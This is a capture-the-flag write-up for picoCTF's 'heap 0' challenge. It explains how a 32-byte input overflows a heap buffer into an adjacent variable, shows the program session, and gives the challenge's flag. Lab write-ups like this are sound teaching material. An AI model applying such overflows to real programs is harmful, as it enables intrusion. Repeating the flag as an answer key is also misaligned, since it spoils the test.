# [heap 0](https://play.picoctf.org/practice/challenge/438)

## Overview

**Points**: 50

**Category**: [Binary Exploitation](../)

## Description

Are overflows just a stack concern?
Download the binary [here](https://artifacts.picoctf.net/c_tethys/30/chall).
Download the source [here](https://artifacts.picoctf.net/c_tethys/30/chall.c).
Connect with the challenge instance here:
`nc tethys.picoctf.net <port>`

## Hints

1. What part of the heap do you have control over and how far is it from the
safe\_var?

## Solution
```c
input_data = malloc(INPUT_DATA_SIZE);
strncpy(input_data, "pico", INPUT_DATA_SIZE);
safe_var = malloc(SAFE_VAR_SIZE);
strncpy(safe_var, "bico", SAFE_VAR_SIZE);
```

After looking at the code, we see that the program stores the user input in a heap, with a certain size. Since the variables are stored right after each other, we can overflow the `input_data` buffer and overwrite the `safe_var` variable, as shown by the image below.

![buffer overflow](./buffer-overflow.png)

After experimenting with different values, we see that we need 32 bytes to overflow the buffer (each variable has a space of 32 bytes).

```sh
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5b95791e42b0  ->   pico
+-------------+----------------+
[*]   0x5b95791e42d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5fc712bf92b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+
[*]   0x5fc712bf92d0  ->   
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_e4c92a78}
```

## Flag

`picoCTF{my_first_heap_overflow_e4c92a78}`
